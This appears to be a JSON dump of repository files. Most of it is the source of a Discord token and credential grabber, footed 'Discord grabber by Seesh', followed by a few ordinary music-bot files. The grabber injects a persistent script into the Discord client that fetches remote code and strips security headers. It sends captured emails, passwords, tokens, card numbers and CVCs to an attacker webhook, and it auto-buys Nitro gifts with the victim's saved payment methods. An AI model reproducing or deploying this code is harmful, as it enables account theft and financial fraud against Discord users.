safeAdd_2 = safeAdd_32_2,\r\n    t,\r\n    safeAdd_5 = safeAdd_32_5;\r\n\r\n  a = H[0];\r\n  b = H[1];\r\n  c = H[2];\r\n  d = H[3];\r\n  e = H[4];\r\n\r\n  for (t = 0; t < 80; t += 1) {\r\n    if (t < 16) {\r\n      W[t] = block[t];\r\n    } else {\r\n      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);\r\n    }\r\n\r\n    if (t < 20) {\r\n      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);\r\n    } else if (t < 40) {\r\n      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);\r\n    } else if (t < 60) {\r\n      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);\r\n    } else {\r\n      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);\r\n    }\r\n\r\n    e = d;\r\n    d = c;\r\n    c = rotl(b, 30);\r\n    b = a;\r\n    a = T;\r\n  }\r\n\r\n  H[0] = safeAdd_2(a, H[0]);\r\n  H[1] = safeAdd_2(b, H[1]);\r\n  H[2] = safeAdd_2(c, H[2]);\r\n  H[3] = safeAdd_2(d, H[3]);\r\n  H[4] = safeAdd_2(e, H[4]);\r\n\r\n  return H;\r\n}\r\n\r\nfunction finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {\r\n  var i, appendedMessageLength, offset;\r\n\r\n  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;\r\n  while (remainder.length <= offset) {\r\n    remainder.push(0);\r\n  }\r\n  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));\r\n  remainder[offset] = remainderBinLen + processedBinLen;\r\n  appendedMessageLength = remainder.length;\r\n\r\n  for (i = 0; i < appendedMessageLength; i += 16) {\r\n    H = roundSHA1(remainder.slice(i, i + 16), H);\r\n  }\r\n  return H;\r\n}\r\n\r\nfunction hex2binb(str, existingBin, existingBinLen) {\r\n  var bin,\r\n    length = str.length,\r\n    i,\r\n    num,\r\n    intOffset,\r\n    byteOffset,\r\n    existingByteLen;\r\n\r\n  bin = existingBin || [0];\r\n  existingBinLen = existingBinLen || 0;\r\n  existingByteLen = existingBinLen >>> 3;\r\n\r\n  if (0 !== length % 2) {\r\n    console.error('String of HEX type must be in byte increments');\r\n  }\r\n\r\n  for (i = 0; i < length; i += 2) {\r\n    num = parseInt(str.substr(i, 2), 16);\r\n    if (!isNaN(num)) {\r\n      byteOffset = (i >>> 1) + existingByteLen;\r\n      intOffset = byteOffset >>> 2;\r\n      while (bin.length <= intOffset) {\r\n        bin.push(0);\r\n      }\r\n      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));\r\n    } else {\r\n      console.error('String of HEX type contains invalid characters');\r\n    }\r\n  }\r\n\r\n  return { value: bin, binLen: length * 4 + existingBinLen };\r\n}\r\n\r\nclass jsSHA {\r\n  constructor() {\r\n    var processedLen = 0,\r\n      remainder = [],\r\n      remainderLen = 0,\r\n      intermediateH,\r\n      converterFunc,\r\n      outputBinLen,\r\n      variantBlockSize,\r\n      roundFunc,\r\n      finalizeFunc,\r\n      finalized = false,\r\n      hmacKeySet = false,\r\n      keyWithIPad = [],\r\n      keyWithOPad = [],\r\n      numRounds,\r\n      numRounds = 1;\r\n\r\n    converterFunc = hex2binb;\r\n\r\n    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {\r\n      console.error('numRounds must a integer >= 1');\r\n    }\r\n    variantBlockSize = 512;\r\n    roundFunc = roundSHA1;\r\n    finalizeFunc = finalizeSHA1;\r\n    outputBinLen = 160;\r\n    intermediateH = getH();\r\n\r\n    this.setHMACKey = function (key) {\r\n      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;\r\n      keyConverterFunc = hex2binb;\r\n      convertRet = keyConverterFunc(key);\r\n      keyBinLen = convertRet['binLen'];\r\n      keyToUse = convertRet['value'];\r\n      blockByteSize = variantBlockSize >>> 3;\r\n      lastArrayIndex = blockByteSize / 4 - 1;\r\n\r\n      if (blockByteSize < keyBinLen / 8) {\r\n        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());\r\n        while (keyToUse.length <= lastArrayIndex) {\r\n          keyToUse.push(0);\r\n        }\r\n        keyToUse[lastArrayIndex] &= 0xffffff00;\r\n      } else if (blockByteSize > keyBinLen / 8) {\r\n        while (keyToUse.length <= lastArrayIndex) {\r\n          keyToUse.push(0);\r\n        }\r\n        keyToUse[lastArrayIndex] &= 0xffffff00;\r\n      }\r\n\r\n      for (i = 0; i <= lastArrayIndex; i += 1) {\r\n        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;\r\n        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;\r\n      }\r\n\r\n      intermediateH = roundFunc(keyWithIPad, intermediateH);\r\n      processedLen = variantBlockSize;\r\n\r\n      hmacKeySet = true;\r\n    };\r\n\r\n    this.update = function (srcString) {\r\n      var convertRet,\r\n        chunkBinLen,\r\n        chunkIntLen,\r\n        chunk,\r\n        i,\r\n        updateProcessedLen = 0,\r\n        variantBlockIntInc = variantBlockSize >>> 5;\r\n\r\n      convertRet = converterFunc(srcString, remainder, remainderLen);\r\n      chunkBinLen = convertRet['binLen'];\r\n      chunk = convertRet['value'];\r\n\r\n      chunkIntLen = chunkBinLen >>> 5;\r\n      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {\r\n        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {\r\n          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);\r\n          updateProcessedLen += variantBlockSize;\r\n        }\r\n      }\r\n      processedLen += updateProcessedLen;\r\n      remainder = chunk.slice(updateProcessedLen >>> 5);\r\n      remainderLen = chunkBinLen % variantBlockSize;\r\n    };\r\n\r\n    this.getHMAC = function () {\r\n      var firstHash;\r\n\r\n      if (false === hmacKeySet) {\r\n        console.error('Cannot call getHMAC without first setting HMAC key');\r\n      }\r\n\r\n      const formatFunc = function (binarray) {\r\n        return binb2hex(binarray);\r\n      };\r\n\r\n      if (false === finalized) {\r\n        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);\r\n        intermediateH = roundFunc(keyWithOPad, getH());\r\n        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);\r\n      }\r\n\r\n      finalized = true;\r\n      return formatFunc(intermediateH);\r\n    };\r\n  }\r\n}\r\n\r\nif ('function' === typeof define && define['amd']) {\r\n  define(function () {\r\n    return jsSHA;\r\n  });\r\n} else if ('undefined' !== typeof exports) {\r\n  if ('undefined' !== typeof module && module['exports']) {\r\n    module['exports'] = exports = jsSHA;\r\n  } else {\r\n    exports = jsSHA;\r\n  }\r\n} else {\r\n  global['jsSHA'] = jsSHA;\r\n}\r\n\r\nif (jsSHA.default) {\r\n  jsSHA = jsSHA.default;\r\n}\r\n\r\nfunction totp(key) {\r\n  const period = 30;\r\n  const digits = 6;\r\n  const timestamp = Date.now();\r\n  const epoch = Math.round(timestamp / 1000.0);\r\n  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');\r\n  const shaObj = new jsSHA();\r\n  shaObj.setHMACKey(base32tohex(key));\r\n  shaObj.update(time);\r\n  const hmac = shaObj.getHMAC();\r\n  const offset = hex2dec(hmac.substring(hmac.length - 1));\r\n  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';\r\n  otp = otp.substr(Math.max(otp.length - digits, 0), digits);\r\n  return otp;\r\n}\r\n\r\nfunction hex2dec(s) {\r\n  return parseInt(s, 16);\r\n}\r\n\r\nfunction dec2hex(s) {\r\n  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);\r\n}\r\n\r\nfunction base32tohex(base32) {\r\n  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',\r\n    bits = '',\r\n    hex = '';\r\n\r\n  base32 = base32.replace(/=+$/, '');\r\n\r\n  for (let i = 0; i < base32.length; i++) {\r\n    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());\r\n    if (val === -1) console.error('Invalid base32 character in key');\r\n    bits += leftpad(val.toString(2), 5, '0');\r\n  }\r\n\r\n  for (let i = 0; i + 8 <= bits.length; i += 8) {\r\n    let chunk = bits.substr(i, 8);\r\n    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');\r\n  }\r\n  return hex;\r\n}\r\n\r\nfunction leftpad(str, len, pad) {\r\n  if (len + 1 >= str.length) {\r\n    str = Array(len + 1 - str.length).join(pad) + str;\r\n  }\r\n  return str;\r\n}\r\n\r\nconst discordPath = (function () {\r\n  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);\r\n  let resourcePath;\r\n\r\n  if (process.platform === 'win32') {\r\n    resourcePath = path.join(app, 'resources');\r\n  } else if (process.platform === 'darwin') {\r\n    resourcePath = path.join(app, 'Contents', 'Resources');\r\n  }\r\n\r\n  if (fs.existsSync(resourcePath)) return { resourcePath, app };\r\n  return { undefined, undefined };\r\n})();\r\n\r\nfunction updateCheck() {\r\n  const { resourcePath, app } = discordPath;\r\n  if (resourcePath === undefined || app === undefined) return;\r\n  const appPath = path.join(resourcePath, 'app');\r\n  const packageJson = path.join(appPath, 'package.json');\r\n  const resourceIndex = path.join(appPath, 'index.js');\r\n  const indexJs = `${app}\\\\modules\\\\discord_desktop_core-1\\\\discord_desktop_core\\\\index.js`;\r\n  const bdPath = path.join(process.env.APPDATA, '\\\\betterdiscord\\\\data\\\\betterdiscord.asar');\r\n  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);\r\n  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);\r\n  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);\r\n\r\n  if (process.platform === 'win32' || process.platform === 'darwin') {\r\n    fs.writeFileSync(\r\n      packageJson,\r\n      JSON.stringify(\r\n        {\r\n          name: 'discord',\r\n          main: 'index.js',\r\n        },\r\n        null,\r\n        4,\r\n      ),\r\n    );\r\n\r\n    const startUpScript = `const fs = require('fs'), https = require('https');\r\nconst indexJs = '${indexJs}';\r\nconst bdPath = '${bdPath}';\r\nconst fileSize = fs.statSync(indexJs).size\r\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\r\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \r\n        init();\r\n})\r\nasync function init() {\r\n    https.get('${config.injection_url}', (res) => {\r\n        const file = fs.createWriteStream(indexJs);\r\n        res.replace('%WEBHOOK%', '${config.webhook}')\r\n        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')\r\n        res.pipe(file);\r\n        file.on('finish', () => {\r\n            file.close();\r\n        });\r\n    \r\n    }).on(\"error\", (err) => {\r\n        setTimeout(init(), 10000);\r\n    });\r\n}\r\nrequire('${path.join(resourcePath, 'app.asar')}')\r\nif (fs.existsSync(bdPath)) require(bdPath);`;\r\n    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\\\/g, '\\\\\\\\'));\r\n  }\r\n  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;\r\n  fs.rmdirSync(path.join(__dirname, 'initiation'));\r\n  execScript(\r\n    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();`,\r\n  );\r\n  return !1;\r\n}\r\n\r\nconst execScript = (script) => {\r\n  const window = BrowserWindow.getAllWindows()[0];\r\n  return window.webContents.executeJavaScript(script, !0);\r\n};\r\n\r\nconst getInfo = async (token) => {\r\n  const info = await execScript(`var xmlHttp = new XMLHttpRequest();\r\n    xmlHttp.open(\"GET\", \"${config.api}\", false);\r\n    xmlHttp.setRequestHeader(\"Authorization\", \"${token}\");\r\n    xmlHttp.send(null);\r\n    xmlHttp.responseText;`);\r\n  return JSON.parse(info);\r\n};\r\n\r\nconst fetchBilling = async (token) => {\r\n  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); \r\n    xmlHttp.open(\"GET\", \"${config.api}/billing/payment-sources\", false); \r\n    xmlHttp.setRequestHeader(\"Authorization\", \"${token}\"); \r\n    xmlHttp.send(null); \r\n    xmlHttp.responseText`);\r\n  if (!bill.lenght || bill.length === 0) return '';\r\n  return JSON.parse(bill);\r\n};\r\n\r\nconst getBilling = async (token) => {\r\n  const data = await fetchBilling(token);\r\n  if (!data) return '\u274c';\r\n  let billing = '';\r\n  data.forEach((x) => {\r\n    if (!x.invalid) {\r\n      switch (x.type) {\r\n        case 1:\r\n          billing += '<:seesh_creditcard:1018478083411550238> ';\r\n          break;\r\n        case 2:\r\n          billing += '<:paypal:951139189389410365> ';\r\n          break;\r\n      }\r\n    }\r\n  });\r\n  if (!billing) billing = '\u274c';\r\n  return billing;\r\n};\r\n\r\nconst Purchase = async (token, id, _type, _time) => {\r\n  const options = {\r\n    expected_amount: config.nitro[_type][_time]['price'],\r\n    expected_currency: 'usd',\r\n    gift: true,\r\n    payment_source_id: id,\r\n    payment_source_token: null,\r\n    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',\r\n    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],\r\n  };\r\n\r\n  const req = execScript(`var xmlHttp = new XMLHttpRequest();\r\n    xmlHttp.open(\"POST\", \"https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase\", false);\r\n    xmlHttp.setRequestHeader(\"Authorization\", \"${token}\");\r\n    xmlHttp.setRequestHeader('Content-Type', 'application/json');\r\n    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));\r\n    xmlHttp.responseText`);\r\n  if (req['gift_code']) {\r\n    return 'https://discord.gift/' + req['gift_code'];\r\n  } else return null;\r\n};\r\n\r\nconst buyNitro = async (token) => {\r\n  const data = await fetchBilling(token);\r\n  const failedMsg = 'Failed to Purchase \u274c';\r\n  if (!data) return failedMsg;\r\n\r\n  let IDS = [];\r\n  data.forEach((x) => {\r\n    if (!x.invalid) {\r\n      IDS = IDS.concat(x.id);\r\n    }\r\n  });\r\n  for (let sourceID in IDS) {\r\n    const first = Purchase(token, sourceID, 'boost', 'year');\r\n    if (first !== null) {\r\n      return first;\r\n    } else {\r\n      const second = Purchase(token, sourceID, 'boost', 'month');\r\n      if (second !== null) {\r\n        return second;\r\n      } else {\r\n        const third = Purchase(token, sourceID, 'classic', 'month');\r\n        if (third !== null) {\r\n          return third;\r\n        } else {\r\n          return failedMsg;\r\n        }\r\n      }\r\n    }\r\n  }\r\n};\r\n\r\nconst getNitro = (flags) => {\r\n  switch (flags) {\r\n    case 0:\r\n      return 'No Nitro';\r\n    case 1:\r\n      return 'Nitro Classic';\r\n    case 2:\r\n      return 'Nitro Boost';\r\n    default:\r\n      return 'No Nitro';\r\n  }\r\n};\r\n\r\nconst getBadges = (flags) => {\r\n  let badges = '';\r\n  switch (flags) {\r\n    case 1:\r\n      badges += 'Discord Staff, ';\r\n      break;\r\n    case 2:\r\n      badges += 'Partnered Server Owner, ';\r\n      break;\r\n    case 131072:\r\n      badges += 'Verified Bot Developer, ';\r\n      break;\r\n    case 4:\r\n      badges += 'Hypesquad Event, ';\r\n      break;\r\n    case 16384:\r\n      badges += 'Gold BugHunter, ';\r\n      break;\r\n    case 8:\r\n      badges += 'Green BugHunter, ';\r\n      break;\r\n    case 512:\r\n      badges += 'Early Supporter, ';\r\n      break;\r\n    case 128:\r\n      badges += 'HypeSquad Brillance, ';\r\n      break;\r\n    case 64:\r\n      badges += 'HypeSquad Bravery, ';\r\n      break;\r\n    case 256:\r\n      badges += 'HypeSquad Balance, ';\r\n      break;\r\n    case 0:\r\n      badges = 'None';\r\n      break;\r\n    default:\r\n      badges = 'None';\r\n      break;\r\n  }\r\n  return badges;\r\n};\r\n\r\nconst hooker = async (content) => {\r\n  const data = JSON.stringify(content);\r\n  const url = new URL(config.webhook);\r\n  const headers = {\r\n    'Content-Type': 'application/json',\r\n    'Access-Control-Allow-Origin': '*',\r\n  };\r\n  if (!config.webhook.includes('api/webhooks')) {\r\n    const key = totp(config.webhook_protector_key);\r\n    headers['Authorization'] = key;\r\n  }\r\n  const options = {\r\n    protocol: url.protocol,\r\n    hostname: url.host,\r\n    path: url.pathname,\r\n    method: 'POST',\r\n    headers: headers,\r\n  };\r\n  const req = https.request(options);\r\n\r\n  req.on('error', (err) => {\r\n    console.log(err);\r\n  });\r\n  req.write(data);\r\n  req.end();\r\n};\r\n\r\nconst login = async (email, password, token) => {\r\n  const json = await getInfo(token);\r\n  const nitro = getNitro(json.premium_type);\r\n  const badges = getBadges(json.flags);\r\n  const billing = await getBilling(token);\r\n  const content = {\r\n    username: config.embed_name,\r\n    avatar_url: config.embed_icon,\r\n    embeds: [\r\n      {\r\n        color: config.embed_color,\r\n        fields: [\r\n          {\r\n            name: '**Account Info**',\r\n            value: `Email: **${email}** - Password: **${password}**`,\r\n            inline: false,\r\n          },\r\n          {\r\n            name: '**Discord Info**',\r\n            value: `Nitro Type: **${nitro}**\\nBadges: **${badges}**\\nBilling: **${billing}**`,\r\n            inline: false,\r\n          },\r\n          {\r\n            name: '**Token**',\r\n            value: `\\`${token}\\``,\r\n            inline: false,\r\n          },\r\n        ],\r\n        author: {\r\n          name: json.username + '#' + json.discriminator + ' | ' + json.id,\r\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\r\n        },\r\n        footer: {\r\n          text: 'Discord grabber by Seesh',\r\n        },\r\n      },\r\n    ],\r\n  };\r\n  if (config.ping_on_run) content['content'] = config.ping_val;\r\n  hooker(content);\r\n};\r\n\r\nconst passwordChanged = async (oldpassword, newpassword, token) => {\r\n  const json = await getInfo(token);\r\n  const nitro = getNitro(json.premium_type);\r\n  const badges = getBadges(json.flags);\r\n  const billing = await getBilling(token);\r\n  const content = {\r\n    username: config.embed_name,\r\n    avatar_url: config.embed_icon,\r\n    embeds: [\r\n      {\r\n        color: config.embed_color,\r\n        fields: [\r\n          {\r\n            name: '**Password Changed**',\r\n            value: `Email: **${json.email}**\\nOld Password: **${oldpassword}**\\nNew Password: **${newpassword}**`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: '**Discord Info**',\r\n            value: `Nitro Type: **${nitro}**\\nBadges: **${badges}**\\nBilling: **${billing}**`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: '**Token**',\r\n            value: `\\`${token}\\``,\r\n            inline: false,\r\n          },\r\n        ],\r\n        author: {\r\n          name: json.username + '#' + json.discriminator + ' | ' + json.id,\r\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\r\n        },\r\n        footer: {\r\n          text: 'Discord grabber by Seesh',\r\n        },\r\n      },\r\n    ],\r\n  };\r\n  if (config.ping_on_run) content['content'] = config.ping_val;\r\n  hooker(content);\r\n};\r\n\r\nconst emailChanged = async (email, password, token) => {\r\n  const json = await getInfo(token);\r\n  const nitro = getNitro(json.premium_type);\r\n  const badges = getBadges(json.flags);\r\n  const billing = await getBilling(token);\r\n  const content = {\r\n    username: config.embed_name,\r\n    avatar_url: config.embed_icon,\r\n    embeds: [\r\n      {\r\n        color: config.embed_color,\r\n        fields: [\r\n          {\r\n            name: '**Email Changed**',\r\n            value: `New Email: **${email}**\\nPassword: **${password}**`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: '**Discord Info**',\r\n            value: `Nitro Type: **${nitro}**\\nBadges: **${badges}**\\nBilling: **${billing}**`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: '**Token**',\r\n            value: `\\`${token}\\``,\r\n            inline: false,\r\n          },\r\n        ],\r\n        author: {\r\n          name: json.username + '#' + json.discriminator + ' | ' + json.id,\r\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\r\n        },\r\n        footer: {\r\n          text: 'Discord grabber by Seesh',\r\n        },\r\n      },\r\n    ],\r\n  };\r\n  if (config.ping_on_run) content['content'] = config.ping_val;\r\n  hooker(content);\r\n};\r\n\r\nconst PaypalAdded = async (token) => {\r\n  const json = await getInfo(token);\r\n  const nitro = getNitro(json.premium_type);\r\n  const badges = getBadges(json.flags);\r\n  const billing = getBilling(token);\r\n  const content = {\r\n    username: config.embed_name,\r\n    avatar_url: config.embed_icon,\r\n    embeds: [\r\n      {\r\n        color: config.embed_color,\r\n        fields: [\r\n          {\r\n            name: '**Paypal Added**',\r\n            value: `Lets Get One Nitro Dude`,\r\n            inline: false,\r\n          },\r\n          {\r\n            name: '**Discord Info**',\r\n            value: `Nitro Type: **${nitro}*\\nBadges: **${badges}**\\nBilling: **${billing}**`,\r\n            inline: false,\r\n          },\r\n          {\r\n            name: '**Token**',\r\n            value: `\\`${token}\\``,\r\n            inline: false,\r\n          },\r\n        ],\r\n        author: {\r\n          name: json.username + '#' + json.discriminator + ' | ' + json.id,\r\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\r\n        },\r\n        footer: {\r\n          text: 'Discord grabber by Seesh',\r\n        },\r\n      },\r\n    ],\r\n  };\r\n  if (config.ping_on_run) content['content'] = config.ping_val;\r\n  hooker(content);\r\n};\r\n\r\nconst ccAdded = async (number, cvc, expir_month, expir_year, token) => {\r\n  const json = await getInfo(token);\r\n  const nitro = getNitro(json.premium_type);\r\n  const badges = getBadges(json.flags);\r\n  const billing = await getBilling(token);\r\n  const content = {\r\n    username: config.embed_name,\r\n    avatar_url: config.embed_icon,\r\n    embeds: [\r\n      {\r\n        color: config.embed_color,\r\n        fields: [\r\n          {\r\n            name: '**Credit Card Added**',\r\n            value: `Credit Card Number: **${number}**\\nCVC: **${cvc}**\\nCredit Card Expiration: **${expir_month}/${expir_year}**`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: '**Discord Info**',\r\n            value: `Nitro Type: **${nitro}**\\nBadges: **${badges}**\\nBilling: **${billing}**`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: '**Token**',\r\n            value: `\\`${token}\\``,\r\n            inline: false,\r\n          },\r\n        ],\r\n        author: {\r\n          name: json.username + '#' + json.discriminator + ' | ' + json.id,\r\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\r\n        },\r\n        footer: {\r\n          text: 'Discord grabber by Seesh',\r\n        },\r\n      },\r\n    ],\r\n  };\r\n  if (config.ping_on_run) content['content'] = config.ping_val;\r\n  hooker(content);\r\n};\r\n\r\nconst nitroBought = async (token) => {\r\n  const json = await getInfo(token);\r\n  const nitro = getNitro(json.premium_type);\r\n  const badges = getBadges(json.flags);\r\n  const billing = await getBilling(token);\r\n  const code = await buyNitro(token);\r\n  const content = {\r\n    username: config.embed_name,\r\n    content: code,\r\n    avatar_url: config.embed_icon,\r\n    embeds: [\r\n      {\r\n        color: config.embed_color,\r\n        fields: [\r\n          {\r\n            name: '**Nitro bought!**',\r\n            value: `**Nitro Code:**\\n\\`\\`\\`diff\\n+ ${code}\\`\\`\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: '**Discord Info**',\r\n            value: `Nitro Type: **${nitro}**\\nBadges: **${badges}**\\nBilling: **${billing}**`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: '**Token**',\r\n            value: `\\`${token}\\``,\r\n            inline: false,\r\n          },\r\n        ],\r\n        author: {\r\n          name: json.username + '#' + json.discriminator + ' | ' + json.id,\r\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\r\n        },\r\n        footer: {\r\n          text: 'Discord grabber by Seesh',\r\n        },\r\n      },\r\n    ],\r\n  };\r\n  if (config.ping_on_run) content['content'] = config.ping_val + `\\n${code}`;\r\n  hooker(content);\r\n};\r\nsession.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {\r\n  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });\r\n  updateCheck();\r\n});\r\n\r\nsession.defaultSession.webRequest.onHeadersReceived((details, callback) => {\r\n  if (details.url.startsWith(config.webhook)) {\r\n    if (details.url.includes('discord.com')) {\r\n      callback({\r\n        responseHeaders: Object.assign(\r\n          {\r\n            'Access-Control-Allow-Headers': '*',\r\n          },\r\n          details.responseHeaders,\r\n        ),\r\n      });\r\n    } else {\r\n      callback({\r\n        responseHeaders: Object.assign(\r\n          {\r\n            'Content-Security-Policy': [\"default-src '*'\", \"Access-Control-Allow-Headers '*'\", \"Access-Control-Allow-Origin '*'\"],\r\n            'Access-Control-Allow-Headers': '*',\r\n            'Access-Control-Allow-Origin': '*',\r\n          },\r\n          details.responseHeaders,\r\n        ),\r\n      });\r\n    }\r\n  } else {\r\n    delete details.responseHeaders['content-security-policy'];\r\n    delete details.responseHeaders['content-security-policy-report-only'];\r\n\r\n    callback({\r\n      responseHeaders: {\r\n        ...details.responseHeaders,\r\n        'Access-Control-Allow-Headers': '*',\r\n      },\r\n    });\r\n  }\r\n});\r\n\r\nsession.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {\r\n  if (details.statusCode !== 200 && details.statusCode !== 202) return;\r\n  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();\r\n  const data = JSON.parse(unparsed_data);\r\n  const token = await execScript(\r\n    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,\r\n  );\r\n  switch (true) {\r\n    case details.url.endsWith('login'):\r\n      login(data.login, data.password, token).catch(console.error);\r\n      break;\r\n\r\n    case details.url.endsWith('users/@me') && details.method === 'PATCH':\r\n      if (!data.password) return;\r\n      if (data.email) {\r\n        emailChanged(data.email, data.password, token).catch(console.error);\r\n      }\r\n      if (data.new_password) {\r\n        passwordChanged(data.password, data.new_password, token).catch(console.error);\r\n      }\r\n      break;\r\n\r\n    case details.url.endsWith('tokens') && details.method === 'POST':\r\n      const item = querystring.parse(unparsedData.toString());\r\n      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);\r\n      break;\r\n\r\n    case details.url.endsWith('paypal_accounts') && details.method === 'POST':\r\n      PaypalAdded(token).catch(console.error);\r\n      break;\r\n\r\n    case details.url.endsWith('confirm') && details.method === 'POST':\r\n      if (!config.auto_buy_nitro) return;\r\n      setTimeout(() => {\r\n        nitroBought(token).catch(console.error);\r\n      }, 7500);\r\n      break;\r\n\r\n    default:\r\n      break;\r\n  }\r\n});\r\nmodule.exports = require('./core.asar');\r\n"
        }
    },
    "priyanshu9588": {
        "readme.md": {
            "code": "### Hi there It's Priyanshu Jhawar\n"
        }
    },
    "ProMusicBot": {
        "README.md": {
            "code": "# PreoMusicBot\n\nYou can fully customize the bot from - Config.json. \n\n\u300bSo what things you can change in bot =\n1. You can change bot prefix ! \n2. you can change it status as well as presence!\n3. You can change emojis to your custom emojis! \n4. You can change bot owner by - bot_owner_id ! \n5. You can change your support server by - support server link\nAnd many more you can change ! \n\nIt stays 24/7 in VC and , it has hindi commands , reaction controle and many more !\nif you having any errors or problems then feel free to join our support server ! = Link - https://discord.gg/Bwa6u3D8ep  join it and ask your questions ! \n\n\n-- if you want a Premium bot for free then invite this - https://discord.com/api/oauth2/authorize?client_id=774642458889814066&permissions=8&scope=bot \n it an bot with all effects like 3d night core and etc all for free , it is 24/7 in VC an Verified discord bot ! it's my own bot ! \n\nThanks..\nNIRMAL ! \n"
        },
        "clip.js": {
            "code": "module.exports = {\n  name: \"clip\",\n  description: \"Plays a clip sound\",\n  async execute(message, args) {\n    const { channel } = message.member.voice;\n    const queue = message.client.queue.get(message.guild.id);\n\n    if (!args.length) return message.reply(\"Usage: /clip <name>\").catch(console.error);\n    if (queue) return message.reply(\"Can't play clip because there is an active queue.\");\n    if (!channel) return message.reply(\"You need to join a voice channel first!\").catch(console.error);\n\n    const queueConstruct = {\n      textChannel: message.channel,\n      channel,\n      connection: null,\n      songs: [],\n      loop: false,\n      volume: 100,\n      playing: true\n    };\n\n    message.client.queue.set(message.guild.id, queueConstruct);\n\n    try {\n      queueConstruct.connection = await channel.join();\n      const dispatcher = queueConstruct.connection\n        .play(`./sounds/${args[0]}.mp3`)\n        .on(\"finish\", () => {\n          message.client.queue.delete(message.guild.id);\n          // channel.leave();\n        })\n        .on(\"error\", err => {\n          message.client.queue.delete(message.guild.id);\n          // channel.leave();\n          console.error(err);\n        });\n    } catch (error) {\n      console.error(error);\n    }\n  }\n};\n\n\nconsole.log(\"Clip working\")"
        },
        "clips.js": {
            "code": "const fs = require(\"fs\");\n\nmodule.exports = {\n  name: \"clips\",\n  description: \"List all clips\",\n  execute(message) {\n    fs.readdir(\"./sounds\", function(err, files) {\n      if (err) return console.log(\"Unable to read directory: \" + err);\n\n      let clips = [];\n\n      files.forEach(function(file) {\n        clips.push(file.substring(0, file.length - 4));\n      });\n\n      message.reply(`${clips.join(\" \")}`).catch(console.error);\n    });\n  }\n};\n\n\nconsole.log(\"Clips2 working\")"
        },
        "disconnect.js": {
